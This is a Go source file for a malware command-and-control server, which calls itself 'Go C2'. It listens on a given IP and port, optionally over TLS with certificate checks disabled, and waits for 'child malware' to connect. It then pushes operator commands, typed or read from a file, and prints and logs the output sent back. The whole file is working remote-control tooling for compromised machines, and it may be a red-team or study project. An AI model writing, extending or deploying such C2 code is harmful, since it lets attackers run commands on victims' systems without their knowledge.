package main

/*
TO DO:
- add base64 encoding of command JSON
- call Accept() uin a loop, to accept more than one connection


Decide if "ID" is needed

Error handling for losing a socket

*/

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"regexp"
	"strings"
)

type Results struct {
	CommandsList []string
	ID           int
	Command      string
	Output       string
	Time         string
}
type ResultsToFile struct {
	// CommandsList []string
	// ID      int
	Time    string
	Command string
	Output  string
}

var (
	//which IP and Port to connect too
	connect = flag.String("connect", "", "connection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	// Commands file to use
	commands = flag.String("commands", "", "Execute a list of commands from a file. Include file name eg: commands commands.txt")
	//Logging to a file
	loggingName = flag.String("log", "", "Log to a json file. eg \"-log logfile\" will log commands to logfile.json")

	// fileInfo    *os.FileInfo - testing if can delete
	// TLS or no TLS
	tlsOn = flag.Bool("tls", false, "Will add TLS to the network traffic")
	//Skip Pauses in tool
	skipEnter = flag.Bool("skip", false, "Will skip Enter requirement and run automatically, speeds testing")
)

func checkFile(filename string) error {
	_, err := os.Stat(filename)
	if os.IsNotExist(err) {
		_, err := os.Create(filename)
		if err != nil {
			return err
		}
	}
	return nil
}

func logToFile(outputTest *Results) {

	var fileName string
	fileName = *loggingName + ".json"

	//error is within the function
	_ = checkFile(fileName)

	outPutLog := &ResultsToFile{
		// ID:      outputTest.ID,
		Output:  outputTest.Output,
		Time:    outputTest.Time,
		Command: outputTest.Command,
	}

	/*reads the file, unmarshals to the resultsToFile struct
	then reads the current struct outPutLog and apppends it
	then marshes the json and writes it to the file

	this allows the function to be called multiple times to write
	the JSON to a file keeping it as multiple JSON objects
	*/

	file, _ := ioutil.ReadFile(fileName)
	data := []ResultsToFile{}
	json.Unmarshal(file, &data)
	data = append(data, *outPutLog)
	// err := c.(*tls.Conn.Handshake())
	dataBytes, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error in marshalling data")
	}
	// if err != nil {
	// 	logrus.Error(err)
	if err := ioutil.WriteFile(fileName, dataBytes, 0644); err != nil {
		fmt.Println("unable to write to file")
	}

}

func listMode(fileToRead string, conn net.Conn) {

	fmt.Println("Reading commands from: ", fileToRead)
	//Opening File
	file, err := os.Open(fileToRead)
	if err != nil {
		fmt.Println("Unable to open the file", err)
		log.Fatal(err.Error())
	}

	//Reading file in line by line
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string // array to hold each command
	// Appending each line in the file to the txtlines array
	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	fmt.Println("COMMANDS that will be run on the child malware:")
	//Printing commands to screen
	for _, value := range txtlines {
		fmt.Println(value)
	}

	// Creating structure object of Results to send to client
	ListofCommands := &Results{
		ID: 1,

		CommandsList: txtlines,
	}

	//Attaching JSON encoder to CONN to send
	encoder := json.NewEncoder(conn)
	//Sending Structure with list of commands to client
	encoder.Encode(ListofCommands)

	//creating variable to place results into (Results struct)
	var outputResults Results
	// For each command in the array, we expect to receive a response
	// Loop through the length of the array and print output and Log
	for x := 0; x < len(ListofCommands.CommandsList); x++ {
		decoder := json.NewDecoder(conn)
		decoder.Decode(&outputResults)
		//Output to screen
		fmt.Println("===Results===")
		fmt.Println("Time of command execution: ", outputResults.Time)
		fmt.Println(outputResults.ID, outputResults.Output)

		//log to file if selected
		if *loggingName != "" {

			logToFile(&outputResults)
		}

	}
}

func checkError(err error) {
	if err != nil {
		fmt.Println("Fatal error ", err.Error())
		os.Exit(1)
	}
}

func connectTLS() net.Conn {
	var conn net.Conn
	var listen net.Listener

	if *commands != "" {
		fmt.Println("Go C2 will run in Command List Mode")
		fmt.Println("Please note, Command List Mode does not use TLS")

		if *skipEnter == false {
			reader := bufio.NewReader(os.Stdin)
			fmt.Println("<PRESS ENTER TO CONTINUE>")
			_, _ = reader.ReadString('\n')
		}
	}

	if *tlsOn == true {
		fmt.Println("TLS enabled")
		cert, err := tls.LoadX509KeyPair("../openssl/mydomain.com.crt", "../openssl/mydomain.com.key")
		checkError(err)
		config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
		//  if err := c.(*tls.Conn.Handshake()); err != nil {
		listen, err = tls.Listen("tcp", *connect, &config)
		if err != nil {
			fmt.Println("error with TLS")

		}

	} else {
		fmt.Println("Running in clear text")
		listen, _ = net.Listen("tcp", *connect)
		// checkError(err)
		// if err != nil {
		// 	fmt.Println(err)

		// }
	}

	if *loggingName != "" {
		fmt.Println("Will log data to:", *loggingName)
	} else {
		fmt.Println("Logging: OFF")
	}

	fmt.Println("===ADMIN SERVER LISTENING ===")
	fmt.Println("Admin interface will listen on: ", *connect)
	fmt.Println("Connect the Child Malware to: ", *connect)
	defer listen.Close()

	conn, _ = listen.Accept()
	if *tlsOn == true {
		if err := conn.(*tls.Conn).Handshake(); err != nil {

			log.Fatal(err.Error())
		}
	}
	// }
	fmt.Println("PARENT CONNECTED")

	return conn
}

func main() {
	//parsing flags
	flag.Parse()

	if *connect == "" {
		fmt.Println("empty connection")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Check connect has port and IP

	// NEED ERROR LOGGING FOR IP THAT DOES NOT HAVE PORT NUMBER
	// func MatchString(pattern string, s string) (matched bool, err error)

	// ipTest := strings.Split(*connect, ":")

	patternIP := "^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}:([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
	regexIP, _ := regexp.MatchString(patternIP, *connect)
	if regexIP == false {
		fmt.Println("ERROR: NOT IN CORRECT IP FORMAT such as 192.168.0.1:1234")
		os.Exit(1)
	}

	// if len(ipTest) != 2 && ipTest[1] == "" {
	// 	fmt.Println("missing port number")
	// 	os.Exit(1)
	// }

	// portCheck, _ := strconv.Atoi(ipTest[1])

	// if portCheck > 65535 {
	// 	fmt.Println("Not a valid port number. Greater than 65535")
	// 	os.Exit(1)
	// }

	if *commands != "" {
		listMode(*commands, connectTLS())

	} else { // ELSE will run standard client mode
		fmt.Println("Running in Standard Client Server Mode")
		// send program flow to create socket
		for {

			c := connectTLS()

			for {
				// Read in data from CLI, send to listening client
				reader := bufio.NewReader(os.Stdin)
				fmt.Print(">> ")
				text, _ := reader.ReadString('\n')

				fmt.Fprintf(c, text+"\n")

				// if STOp is typed
				if strings.TrimSpace(string(text)) == "STOP" {
					fmt.Fprintf(c, text+"\n")
					fmt.Println("Closing TCP server!")

					return
				}
				/* receiving data
				creating a decode, attaching the connect c
				decoding into Results struct
				*/
				var outputTest Results
				decoder := json.NewDecoder(c)

				//catch if connect was closed
				if err := decoder.Decode(&outputTest); err != nil {
					log.Println(err.Error())
					fmt.Println("!!!! LOST CONNECTION RESTARTING !!!! ")

					break // break out of loop and restart a connection and listen
				}
				fmt.Println("===Results===")

				fmt.Printf("Time of command execution: :%s\n", outputTest.Time)
				fmt.Println(outputTest.Output)

				//log commands at end of loop if selected
				if *loggingName != "" {
					logToFile(&outputTest)
				}
			}
		}

	}
}
